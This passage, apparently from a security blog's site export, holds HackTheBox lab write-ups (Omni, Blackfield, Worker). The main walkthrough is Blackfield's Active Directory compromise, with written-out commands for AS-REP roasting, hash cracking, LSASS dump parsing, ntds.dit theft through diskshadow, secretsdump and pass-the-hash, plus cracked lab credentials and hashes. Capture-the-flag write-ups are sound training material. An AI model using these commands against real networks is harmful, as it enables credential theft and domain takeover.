N=\u0026#34;Password\u0026#34;\u0026gt;01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7\u0026lt;/SS\u0026gt; \u0026lt;/Props\u0026gt; \u0026lt;/Obj\u0026gt; \u0026lt;/Objs\u0026gt; This article shows way to decrypt those two files.\n$credential = Import-CliXml -Path \u0026lt;PathToXml\u0026gt;\\MyCredential.xml $credential.GetNetworkCredential().Password But then, I get an \u0026ldquo;Error occurred during a cryptographic operation\u0026rdquo; message. After Googling around to find the answer why it doesn’t work, it turns out the flag can only be decrypted by the user itself. So if I want to decrypt user.txt, I have to get access as app user.\nWhile enumerating files recursively using the dir command, I spotted a batch file placed in the PowerShell folder.\nPS C:\\\u0026gt;cmd /c \u0026#34;dir /s /b *.bat\u0026#34; cmd /c \u0026#34;dir /s /b *.bat\u0026#34; C:\\Program Files\\WindowsPowerShell\\Modules\\PackageManagement\\r.bat C:\\Program Files\\WindowsPowerShell\\Modules\\Pester\\3.4.0\\Build.bat C:\\Program Files\\WindowsPowerShell\\Modules\\Pester\\3.4.0\\bin\\Pester.bat The batch files contains the credentials for user app and administrator. The file itself looks like automation script to revert the user and admin account to default.\nPS C:\\\u0026gt; gc \u0026#34;C:\\Program Files\\WindowsPowerShell\\Modules\\PackageManagement\\r.bat\u0026#34; gc \u0026#34;C:\\Program Files\\WindowsPowerShell\\Modules\\PackageManagement\\r.bat\u0026#34; @echo off :LOOP for /F \u0026#34;skip=6\u0026#34; %%i in (\u0026#39;net localgroup \u0026#34;administrators\u0026#34;\u0026#39;) do net localgroup \u0026#34;administrators\u0026#34; %%i /delete net user app mesh5143 net user administrator _1nt3rn37ofTh1nGz ping -n 3 127.0.0.1 cls GOTO :LOOP :EXIT Decrypting the Flags Both credentials are works on the Windows Device Portal (WDP) web. WDP has a feature that allows you to do command execution on the system, so I can decrypt each flag from there.\nFor the root flag, I\u0026rsquo;ll use the administrator account (administrator:_1nt3rn37ofTh1nGz) and issue the command below.\npowershell.exe -c \u0026#34;$credential=Import-CliXml -Path U:\\Users\\Administrator\\root.txt ;$credential.GetNetworkCredential().Password;\u0026#34; For the user flag, the procedure goes the same.\n References  https://nmap.org/nsedoc/scripts/http-auth.html https://github.com/SafeBreach-Labs/SirepRAT  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-omni/","summary":"Omni is an easy difficulty machine from HackTheBox that runs the IoT version of Windows 10. The machine is known to be vulnerable to SirepRAT, allowing an attacker to gain a remote code execution as SYSTEM. Leveraging the RAT, I\u0026rsquo;m able to gain a foothold on the system and obtain two set of credentials that can be used to decrypt the encrypted flags.\nSkills Learned  Exploiting Windows IoT Decrypting PSCredential object  Tools  Kali Linux (Attacking Machine) - https://www.","tags":["OSCP-like","Windows","Windows-IoT","SirepRAT","PSCredential"],"title":"HackTheBox - Omni"},{"content":"Blackfield is a hard difficulty Windows machine from HackTheBox that features Active Directory environment. It begins with collecting a list of usernames from an SMB share. With these usernames, I\u0026rsquo;m able to perform AS-REP roasting attack and obtain a TGT from a helpdesk account. The helpdesk account can be used to reset the password of an audit account. Re-enumerating SMB shares using the audit account finds an LSASS memory dump file. The dump file contains an NT hash of a service account that is a member of Backup Operators. The privileges of the Backup Operators group can be abused to create a volume shadow copy and pull the NTDS.dit file from there. With the NTDS.dit file, I\u0026rsquo;m able to retrieves the NT hash of the administrator account, and then perform pass-the-hash attack to gain administrator access.\nSkills Learned  AS-REP roasting LDAP enumeration BloodHound Abusing Windows Access Tokens - SeBackupPrivilege  Tools  Nmap SMBMap ldapdomaindump CrackMapExec BloodHound BloodHound.py SeBackupPrivilege CmdLets  Reconnaissance Nmap An initial TCP scan with nmap discovers at least seven open ports. These ports are the typical port used by Active Directory Domain Controller (AD DC).\n→ root@iamf «blackfield» «10.10.14.169» $ nmap -sC -sV -oN initial-blackfield 10.10.10.192 Nmap scan report for blackfield.htb (10.10.10.192) Host is up (0.054s latency). PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020–10–04 10:53:38Z) 135/tcp open msrpc Microsoft Windows RPC 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=10/3%Time=5F794746%P=x86_64-pc-linux-gnu%r(DNSV SF:ersionBindReqTCP,20,\u0026#34;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\ SF:x04bind\\0\\0\\x10\\0\\x03\u0026#34;); Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 6h59m59s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020–10–04T10:55:58 |_ start_date: N/A I will summarize the results:\n There is a DNS service on port 53, but HTB box is a single machine, so enumerating this service is not priority. There is a Kerberos service on port 88 is running Kerberos. I can try AS-REP roasting here. There is MS-RPC service on port 135, which I don\u0026rsquo;t touch it really often, so I\u0026rsquo;ll lower the priority. There is an LDAP service on port 389, LDAP is the standard protocol for directory services. Active Directory is Microsoft\u0026rsquo;s implementation of directory services and it supports LDAP query. There is an SMB service on port 445. I can try anonymous login here. Port 3268 is running LDAP as well, but it\u0026rsquo;s used as global catalog (read more: here).  nmap also identified the AD domain name to be blackfield.local.\nEnumeration TCP 389 - LDAP On LDAP, I can send a query to obtain the domain metadata, but first I\u0026rsquo;ll look into the rootDSE1 to retrieve a list of the domain naming context.\n→ root@iamf «blackfield» «10.10.14.169» $ ldapsearch -LLL -x -h 10.10.10.192 -s base namingContexts dn: namingcontexts: DC=BLACKFIELD,DC=local namingcontexts: CN=Configuration,DC=BLACKFIELD,DC=local namingcontexts: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local namingcontexts: DC=DomainDnsZones,DC=BLACKFIELD,DC=local namingcontexts: DC=ForestDnsZones,DC=BLACKFIELD,DC=local   -LLL: removes every comments in the output\n  -x: do simple authentication\n  -h: hostname or IP\n  -s: search scope, base will returns the contents of rootDSE.\n  I can use DC=BLACKFIELD,DC=local (this is called as distinguished name), but unfortunately the anonymous bind is not allowed.\nTCP 445 - SMB Trying anonymous login with crackmapexec returns a status access denied.\n→ root@iamf «blackfield» «10.10.14.169» $ crackmapexec smb 10.10.10.192 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --shares SMB 10.10.10.192 445 DC01 [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) SMB 10.10.10.192 445 DC01 [-] BLACKFIELD.local\\: STATUS_ACCESS_DENIED SMB 10.10.10.192 445 DC01 [-] Error enumerating shares: STATUS_ACCESS_DENIED But on using smbclient, it return the shares list.\n→ root@iamf «blackfield» «10.10.14.169» $ smbclient -N -L //10.10.10.192/ Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share forensic Disk Forensic / Audit share. IPC$ IPC Remote IPC NETLOGON Disk Logon server share profiles$ Disk SYSVOL Disk Logon server share Reconnecting with SMB1 for workgroup listing. do_connect: Connection for 10.10.10.192 failed (Error NT_STATUS_IO_TIMEOUT) Unable to connect with SMB1 -- no workgroup available Later, I came to know that ‘anonymous’ must be specified in crackmapexec.\nprofiles$ share I have read permission on the profile$ share. The share contains a bunch of empty users folder.\nI can convert these folders name to list of username using awk '{print $1}'.\n→ root@iamf «blackfield» «10.10.14.169» $ cat folder.list | awk \u0026#39;{print $1}\u0026#39; | tee users.list AAlleni ABarteski ABekesz ABenzies ABiemiller AChampken ...\u0026lt;SNIP\u0026gt;... Now that I have a list of usernames, I can try AS-REP roast attack.\nTCP 88 - Kerberos AS-REP roasting I\u0026rsquo;ll use GetNPUsers.py to perform AS-REP roasting on Kerberos.\n→ root@iamf «blackfield» «10.10.14.169» $ GetNPUsers.py BLACKFIELD.LOCAL/ -no-pass -usersfile users.list -dc-ip 10.10.10.192 -outputfile TGT_AS-REP And I will watch the output file using watch command\n→ root@iamf «blackfield» «10.10.14.169» $ watch -n 1 cat TGT_AS-REP After a few minutes, it shows the hash for user support.\nI\u0026rsquo;ll send the hash to my Windows for cracking.\n→ root@iamf «blackfield» «10.10.14.169» $ cat TGT_AS-REP $krb5asrep$23$support@BLACKFIELD.LOCAL:55211d2eb15e1539552de705eb8605c4$821c479c296fc01c7db5c01f75c08cedd607897692d622f1de2972d6601ebd880b3cb32e663e8c1a2cac5f2531aa1f1cb1323bc6b2a1816d212f179031952b9c1c1290cf11066339706d5cc592ab1e4e9de40e4db0986647c550860b2677671ce6b4b73761e119f56d9651b277a1297a87fa160e22eed4ecee7cb522c03d142cac647a467dfc48f69afb17fef110337134cfef9070f0b1f34d073772409dc31c6c0d0edea5562a9a37387ea44a48fb4947277e84300db0bf7da4ec5a9b3be94a7a1d4c910b1dd39f17ace62366f8e111dca756e13359750171464cd23b23e7b33d427a42978b489dc0a58bc9e586ff02ff3ab805 Cracking the Hash I\u0026rsquo;ll use dictionary attack to recover the user password using hashcat, and it cracks within a few seconds.\nC:\\tools\\hashcat6\u0026gt; hashcat -m 18200 hashes/blackfield.hash rockyou.txt -O hashcat (v6.1.1) starting... ...\u0026lt;SNIP\u0026gt;... $krb5asrep$23$support@BLACKFIELD.LOCAL:55211d2eb15e1539552de705eb8605c4$821c479c296fc01c7db5c01f75c08cedd607897692d622f1de2972d6601ebd880b3cb32e663e8c1a2cac5f2531aa1f1cb1323bc6b2a1816d212f179031952b9c1c1290cf11066339706d5cc592ab1e4e9de40e4db0986647c550860b2677671ce6b4b73761e119f56d9651b277a1297a87fa160e22eed4ecee7cb522c03d142cac647a467dfc48f69afb17fef110337134cfef9070f0b1f34d073772409dc31c6c0d0edea5562a9a37387ea44a48fb4947277e84300db0bf7da4ec5a9b3be94a7a1d4c910b1dd39f17ace62366f8e111dca756e13359750171464cd23b23e7b33d427a42978b489dc0a58bc9e586ff02ff3ab805:#00^BlackKnight Session..........: hashcat Status...........: Cracked Hash.Name........: Kerberos 5, etype 23, AS-REP Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:55211d2eb15e...3ab805 ...\u0026lt;SNIP\u0026gt;... The password for user support is #00^BlackKnight.\nAccess as support Now that I obtained a set of credentials, I can re-enumerate the available services.\nLDAP Domain Dump The credentials works on LDAP, I can use it to obtain the domain info using ldapdomaindump.\n→ root@iamf «loot» «10.10.14.169» $ ldapdomaindump -u \u0026#39;BLACKFIELD.LOCAL\\support\u0026#39; -p \u0026#39;#00^BlackKnight\u0026#39; -no-json -no-grep 10.10.10.192 [*] Connecting to host... [*] Binding to host [+] Bind OK [*] Starting domain dump [+] Domain dump finished The output from the tool are formatted in HTML document, and I get the following information:\nThe OS information and the computer FQDN.\nThe domain policy.\nThe interesting domain users.\nInteresting groups\nFrom here, I know that user support does not have remote shell access.\nBloodHound There is a python-based ingestor for BloodHound besides SharpHound. It can be used remotely from Linux.\n→ root@iamf «loot» «10.10.14.169» $ python bloodhound.py -c All -u \u0026#39;support@blackfield.local\u0026#39; -p \u0026#39;#00^BlackKnight\u0026#39; -d blackfield.local -dc DC01.BLACKFIELD.local -ns 10.10.10.192  -c: collect method : all -u,-p: credentials set -d: domain name -dc: FQDN of domain controller (it’s on ldap domain dump section → domain_computers.html) -ns: name server / DNS  It returns the following output:\nINFO: Found AD domain: blackfield.local INFO: Connecting to LDAP server: DC01.BLACKFIELD.local INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 18 computers INFO: Connecting to LDAP server: dc01.blackfield.local INFO: Found 316 users INFO: Connecting to GC LDAP server: dc01.blackfield.local INFO: Found 51 groups INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: DC01.BLACKFIELD.local INFO: Done in 00M 18S The output files from the tool are in json format. They are: computers.json, domains.json, groups.json and users.json.\nI can upload these files to BloodHound GUI by drag and drop.\nEnumerating the user support permissions discovers it has ForceChangePassword permission on Audit2020. That means user support is able to change the user audit2020 password.\nReset Audit2020 Password I can change the user audit2020 password using net rpc2. I\u0026rsquo;ll set P@$$w0rd! as the new password for user audit2020.\n→ root@iamf «blackfield» «10.10.14.169» $ net rpc password audit2020 -U \u0026#39;support%#00^BlackKnight\u0026#39; -S 10.10.10.192 Enter new password for audit2020: Access as Audit2020 forensic share With audit2020, I can access the forensic share.\n→ root@iamf «blackfield» «10.10.14.169» $ smbmap -H 10.10.10.192 -u audit2020 -p \u0026#39;P@$$w0rd!\u0026#39; [+] IP: 10.10.10.192:445 Name: BLACKFIELD.local Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share forensic READ ONLY Forensic / Audit share. IPC$ READ ONLY Remote IPC NETLOGON READ ONLY Logon server share profiles$ READ ONLY SYSVOL READ ONLY Logon server share Inside the share, there is three folders, and I\u0026rsquo;ll download all of them to my Kali.\n→ root@iamf «blackfield» «10.10.14.169» $ smbclient -U \u0026#39;audit2020%P@$$w0rd!\u0026#39;//10.10.10.192/forensic Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Sun Feb 23 20:03:16 2020 .. D 0 Sun Feb 23 20:03:16 2020 commands_output D 0 Mon Feb 24 01:14:37 2020 memory_analysis D 0 Fri May 29 03:28:33 2020 tools D 0 Sun Feb 23 20:39:08 2020 smb: \\\u0026gt; recurse on smb: \\\u0026gt; mget * Enumerating on the memory_analysis folder, there is a file called lsass.zip that contains lsass.DMP which is interesting to me.\n→ root@iamf «blackfield» «10.10.14.169» $ file lsass.DMP lsass.DMP: Mini DuMP crash report, 16 streams, Sun Feb 23 18:02:01 2020, 0x421826 type  LSASS (Local Security Authentication Subsystem Service) is a service/process that used to verify and authenticate users on login to a Windows computer. In other words, it holds the Windows credentials.\n Foothold Shell as svc_backup Dump Lsass A tool called pypykatz can be used to dump the contents of lsass.DMP. The NT hash of svc-backup immediately shows up on the top.\nThe hash is 9658d1d1dcd9250115e2205d9f48400d.\nWinRM - svc_backup I knew that this user can login remotely (from LDAP), so I can try it with evil-winrm, and it worked.\n→ root@iamf «blackfield» «10.10.14.169» $ evil-winrm -i 10.10.10.192 -u svc_backup -H \u0026#39;9658d1d1dcd9250115e2205d9f48400d\u0026#39; User flag is done here.\nPrivilege Escalation Shell as Administrator Internal Enumeration Also from LDAP, svc-backup is a member of the Backup Operators group. Each member of the Backup Operators group can perform backup and restore operations. The privilege name to perform those two operations are called SeBackupPrivilege and SeRestorePrivilege.\nThose two privileges can be abused3 using diskshadow4.\nI can\u0026rsquo;t just perform the backup and restore if the system is currently in use. But, there is a technology from Microsoft called \u0026ldquo;Shadow Copy\u0026rdquo; that makes this possible, and that\u0026rsquo;s where diskshadow will be used.\nSo the idea is that I can create a volume shadow of C:\\ drive and backup the NTDS.dit file (AD database) from the volume shadow back to C:\\ drive. After that I can grab the ntds.dit and dump the NT hashes from NTDS.dit locally using secretsdump.py.\nAbusing SeBackupPrivilege To abuse this privilege, I\u0026rsquo;ll use this gist as reference, and I\u0026rsquo;ll need this module.\nThen, I\u0026rsquo;ll create a few scripts to perform all the needed actions (create a volume, grab ntds.dit, and cleanup the volume shadow) in one shot.\nFirst, the script for grabbing ntds.dit, I\u0026rsquo;ll save it as copy.cmd\ncmd.exe /c \u0026#34;powershell.exe -c Import-Module(Resolve-Path(\u0026#39;SeBackupPrivilegeCmdLets.dll\u0026#39;)); Import-Module(Resolve-Path(\u0026#39;SeBackupPrivilegeCmdLets.dll\u0026#39;)); Copy-FileSeBackupPrivilege f:\\windows\\ntds\\ntds.dit C:\\temp\\ntds.dit\u0026#34; Second, the script for creating and deleting the volume shadow, I\u0026rsquo;ll save it as script.txt.\nset context persistent nowriters add volume c: alias iamf create expose %iamf% f: exec \u0026#34;copy.cmd\u0026#34; delete shadows volume %iamf% reset I\u0026rsquo;ll move the modules and the scripts to a folder called exploits.\n→ root@iamf «exploits» «10.10.14.169» $ tree . ├── SeBackupPrivilegeCmdLets.dll ├── SeBackupPrivilegeUtils.dll ├── copy.cmd └── script.txt 0 directories, 4 files Now, I’ll copy these .dll modules, copy.cmd, and script.txt to Blackfield using upload feature from evil-winrm at C:\\temp\\.\n→ root@iamf «exploits» «10.10.14.169» $ evil-winrm -i 10.10.10.192 -u svc_backup -H \u0026#39;9658d1d1dcd9250115e2205d9f48400d\u0026#39; Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc_backup\\Documents\u0026gt;mkdir C:\\temp; cd C:\\temp ...\u0026lt;SNIP\u0026gt;... *Evil-WinRM* PS C:\\temp\u0026gt; upload SeBackupPrivilegeCmdLets.dll ...\u0026lt;SNIP\u0026gt;... *Evil-WinRM* PS C:\\temp\u0026gt; upload SeBackupPrivilegeUtils.dll ...\u0026lt;SNIP\u0026gt;... *Evil-WinRM* PS C:\\temp\u0026gt; upload copy.cmd ...\u0026lt;SNIP\u0026gt;... *Evil-WinRM* PS C:\\temp\u0026gt; upload script.txt ...\u0026lt;SNIP\u0026gt;... After that, I can run diskshadow with the /s option and specify script.txt as the command sequence.\nEvil-WinRM* PS C:\\temp\u0026gt; diskshadow /s script.txt Microsoft DiskShadow version 1.0 Copyright (C) 2013 Microsoft Corporation On computer: DC01, 10/4/2020 8:15:53 AM -\u0026gt; set context persistent nowriters -\u0026gt; add volume c: alias iamf -\u0026gt; create Alias iamf for shadow ID {7c53326a-2617-450c-9d2d-5c381352aa45} set as environment variable. Alias VSS_SHADOW_SET for shadow set ID {6142125a-a889-46a9-9d5e-87ff17b66d2c} set as environment variable. Querying all shadow copies with the shadow copy set ID {6142125a-a889-46a9-9d5e-87ff17b66d2c} * Shadow copy ID = {7c53326a-2617-450c-9d2d-5c381352aa45} %iamf% - Shadow copy set: {6142125a-a889-46a9-9d5e-87ff17b66d2c} %VSS_SHADOW_SET% - Original count of shadow copies = 1 - Original volume name: \\\\?\\Volume{351b4712-0000-0000-0000-602200000000}\\ [C:\\] - Creation time: 10/4/2020 8:15:54 AM - Shadow copy device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy4 - Originating machine: DC01.BLACKFIELD.local - Service machine: DC01.BLACKFIELD.local - Not exposed - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5} - Attributes: No_Auto_Release Persistent No_Writers Differential Number of shadow copies listed: 1 -\u0026gt; expose %iamf% f: -\u0026gt; %iamf% = {7c53326a-2617-450c-9d2d-5c381352aa45} The shadow copy was successfully exposed as f:\\. -\u0026gt; exec \u0026#34;copy.cmd\u0026#34; C:\\temp\u0026gt;cmd.exe /c \u0026#34;powershell.exe -c Import-Module(Resolve-Path(\u0026#39;SeBackupPrivilegeCmdLets.dll\u0026#39;)); Import-Module(Resolve-Path(\u0026#39;SeBackupPrivilegeCmdLets.dll\u0026#39;)); Copy-FileSeBackupPrivilege f:\\windows\\ntds\\ntds.dit C:\\temp\\ntds.dit\u0026#34; Copied 18874368 bytes -\u0026gt; delete shadows volume %iamf% -\u0026gt; %iamf% = {7c53326a-2617-450c-9d2d-5c381352aa45} Deleting shadow copy {7c53326a-2617-450c-9d2d-5c381352aa45} on volume \\\\?\\Volume{351b4712-0000-0000-0000-602200000000}\\ from provider {b5946137-7b9f-4925-af80-51abd60b20d5} [Attributes: 0x00120019]... Number of shadow copies deleted: 1 -\u0026gt; reset Now that I have the ntds.dit, the last file that I need is the registry hive.\nEvil-WinRM* PS C:\\temp\u0026gt; reg save HKLM\\SYSTEM c:\\temp\\system The operation completed successfully. I\u0026rsquo;ll download these files to my Kali using evil-winrm download feature.\nEvil-WinRM* PS C:\\temp\u0026gt; ls Directory: C:\\temp Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 10/4/2020 8:20 AM 18874368 ntds.dit -a---- 10/4/2020 8:14 AM 222 copy.cmd -a---- 10/4/2020 8:15 AM 140 script.txt -a---- 10/4/2020 8:14 AM 12288 SeBackupPrivilegeCmdLets.dll -a---- 10/4/2020 8:14 AM 16384 SeBackupPrivilegeUtils.dll -a---- 10/4/2020 8:21 AM 17547264 system Credentials Dumping Now I can dump the NT hash from ntds.dit and system file using secretsdump.py.\n→ root@iamf «loot» «10.10.14.169» $ secretsdump.py -system system -ntds ntds.dit LOCAL Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation [*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393 [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c [*] Reading and decrypting hashes from ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee::: ...\u0026lt;SNIP\u0026gt;... WinRM - Administrator I can use the NT hash of administrator account to login using evil-winrm pass-the-hash feature.\n→ root@iamf «loot» «10.10.14.169» $ evil-winrm -i 10.10.10.192 -u administrator -H \u0026#39;184fb5e5178480be64824d4cd53b99ee\u0026#39;   It\u0026rsquo;s an anonymous authentication, but limited only to the rootDSE, because the domain controller (DC) needs to know who are we and what authentication do we support, so it exchanges some information about itself.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n https://room362.com/post/2017/reset-ad-user-password-with-linux/\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n https://github.com/giuliano108/SeBackupPrivilege\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-blackfield/","summary":"Blackfield is a hard difficulty Windows machine from HackTheBox that features Active Directory environment. It begins with collecting a list of usernames from an SMB share. With these usernames, I\u0026rsquo;m able to perform AS-REP roasting attack and obtain a TGT from a helpdesk account. The helpdesk account can be used to reset the password of an audit account. Re-enumerating SMB shares using the audit account finds an LSASS memory dump file.","tags":["OSCP-plus","Windows","Active-Directory","Domain-controller","SMB","ASREP-roasting","BloodHound","Bloodhound.py","Net-RPC","SeBackupPrivilege","DiskShadow","evil-winrm","secretsdump.py","ldapdomaindump"],"title":"HackTheBox - Blackfield"},{"content":"Worker is a medium difficulty Windows machine that features a self-hosted Apache Subversion and Azure DevOps server. Enumerating the Subversion server discovers a set of credentials and a subdomain at which the Azure DevOps is hosted. The credentials can be used to login into Azure DevOps server, which then leveraged to gain a foothold on the box by dropping a web shell. Enumeration inside the box finds another set of credentials that also can be used to login into the Azure DevOps. Using the second credentials I obtained, I\u0026rsquo;m able to gain administrator access by exploiting Azure Pipeline.\nSkills Learned  SVN enumeration Windows enumeration Exploiting Azure Pipelines  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux svn cli client - Preinstalled in Kali Linux Evil-WinRM - https://github.com/Hackplayers/evil-winrm  Reconnaissance Nmap An initial TCP scan with nmap discovers two open ports: 80 (HTTP) and 3690 (Subversion)\n→ root@kali «worker» «10.10.14.19» $ nmap -sC -sV -oN worker-initial -v 10.10.10.203 # Nmap 7.80 scan initiated Sun Aug 16 11:35:56 2020 as: nmap -sC -sV -oN worker-initial -v 10.10.10.203 Nmap scan report for dimension.worker.htb (10.10.10.203) Host is up (0.16s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Service Unavailable 3690/tcp open svnserve Subversion Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Performing another scan on typical Active Directory DC ports shows only WinRM (5985) is open.\n→ root@kali «worker» «10.10.14.19» $ nmap -p53,445,389,5985 10.10.10.203 Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-31 13:34 EST Host is up (0.013s latency). PORT STATE SERVICE 53 filtered domain 389 filtered ldap 445 filtered microsoft-ds 5985 open wsman Enumeration TCP 80 - Website Visiting the port 80 displays the IIS default page.\nTCP 3690 - Subversion/SVN This is my first encounter with Subversion, it is a software for version control that is similar to git. To interact with this service, I\u0026rsquo;ll need the Subversion client. Fortunately, it was preinstalled in Kali Linux.\nThe general usage as follows:\nsvn \u0026lt;sub-command\u0026gt; svn://[ip]  Example of subcommand: ls, cat, info, log.  With the subcommand ls, I can list the repository contents.\n→ root@kali «worker» «192.168.2.103» $ svn ls svn://10.10.10.203 dimension.worker.htb/ moved.txt moved.txt tells that the repository is no longer maintained. The latest repo is available at http://devops.worker.htb\n→ root@kali «worker» «192.168.2.103» $ svn cat svn://10.10.10.203/moved.txt This repository has been migrated and will no longer be maintaned here. You can find the latest version at: http://devops.worker.htb // The Worker team :) With the subcommand info, I find the author of the repository. It also reveals that the repository has 5 revisions (commit).\n→ root@kali «worker» «192.168.2.103» $ svn info svn://10.10.10.203 Path: . URL: svn://10.10.10.203 Relative URL: ^/ Repository Root: svn://10.10.10.203 Repository UUID: 2fc74c5a-bc59-0744-a2cd-8b7d1d07c9a1 Revision: 5 Node Kind: directory Last Changed Author: nathen Last Changed Rev: 5 Last Changed Date: 2020-06-20 09:52:00 -0400 (Sat, 20 Jun 2020) I can check the revision log using the sub command log.\n→ root@kali «worker» «192.168.2.103» $ svn log svn://10.10.10.203 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - r5 | nathen | 2020–06–20 09:52:00 -0400 (Sat, 20 Jun 2020) | 1 line Added note that repo has been migrated - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - r4 | nathen | 2020–06–20 09:50:20 -0400 (Sat, 20 Jun 2020) | 1 line Moving this repo to our new devops server which will handle the deployment for us - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - r3 | nathen | 2020–06–20 09:46:19 -0400 (Sat, 20 Jun 2020) | 1 line - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - r2 | nathen | 2020–06–20 09:45:16 -0400 (Sat, 20 Jun 2020) | 1 line Added deployment script - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - r1 | nathen | 2020–06–20 09:43:43 -0400 (Sat, 20 Jun 2020) | 1 line First version - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - The commit message on r2 seems interesting.\nI can check the differences between r1 and r2 using the subcommand diff. The output shows there is a hard-coded credentials.\n→ root@kali «worker» «192.168.2.103» $ svn diff -r 1:2 svn://10.10.10.203/ From here, I\u0026rsquo;ll take note about what I\u0026rsquo;ve found here.\n Two subdomains: dimension.worker.htb and devops.worker.htb A set of credentials: nathen:wendel98  I\u0026rsquo;ll add those two subdomains to my /etc/hosts file.\n10.10.10.203 dimension.worker.htb devops.worker.htb Then after I make sure there is nothing left, I\u0026rsquo;ll revisit port 80 with the newly discovered subdomain.\nTCP 80 - dimension.worker.htb Visiting dimension.worker.htb presented with a static page.\nIt even leads to others static site (with subdomain) which I think they are just decoy.\nBefore moving on, I\u0026rsquo;ll add all the subdomains I found on /#work to my /etc/hosts. They are:\n alpha.worker.htb cartoon.worker.htb lens.worker.htb solid-state.worker.htb spectral.worker.htb story.worker.htb  Now I\u0026rsquo;ll jump over to the mentioned new DevOps server at http://devops.worker.htb.\nAzure DevOps - SmartHotel360 Visiting http://devops.worker.htb pops an authentication prompt. It logs me in after I entered the credentials I obtained from SVN, and the user, nathen, is currently working on a project called \u0026ldquo;SmartHotel360\u0026rdquo;.\nMy first objective is to find out what permission do this user have. I clicked the project and try to lookup into the Project Settings.\nUser permission or group related settings are found to be under the Security menu (Project Settings -\u0026gt; Security Settings).\nIt seems user nathen is the only member of the SmartHotel360 Team.\nAnd the SmartHotel360 team is a member of Contributors group and Projects Valid Users, and this is added by default upon creating a team group.\nThe Contributors group and Projects Valid Users group permissions are defined here, and user nathen inherits those two groups' permission.\nFrom there, I try to lookup into the project\u0026rsquo;s repository.\nI find a bunch of website repositories on the Repos menu. These repositories are previously listed on http://dimension.worker.htb/#work page. User nathen is the author of these repositories.\nOn the Pipelines menu, there are Azure Pipelines for some of the sites. Azure Pipelines is CICD feature from Azure DevOps. It is similar to GitHub Action that I use to rebuild this static site using Hugo when there is a new commit pushed into the main/master branch.\n My video recommendation about CICD: https://www.youtube.com/watch?v=scEDHsr3APg\n User nathen is allowed to queue a builds.\nWith all of these permission, I can make changes such as dropping a web shell to one of the site repositories that has its own pipeline, say the alpha repository which has Alpha-CI, then I can queue those changes to the pipelines and wait until the site re-deployed/hosted. From there, I should be able to access my web-shell.\nFoothold Shell as IIS appool Webshell Upload On my first attempt, it tells me to use pull requests instead of uploading a file directly to the master branch.\nSo, I\u0026rsquo;ll upload my web shell which is cmdasp.aspx (because the web server is IIS) on a new branch. I’ll be using the alpha 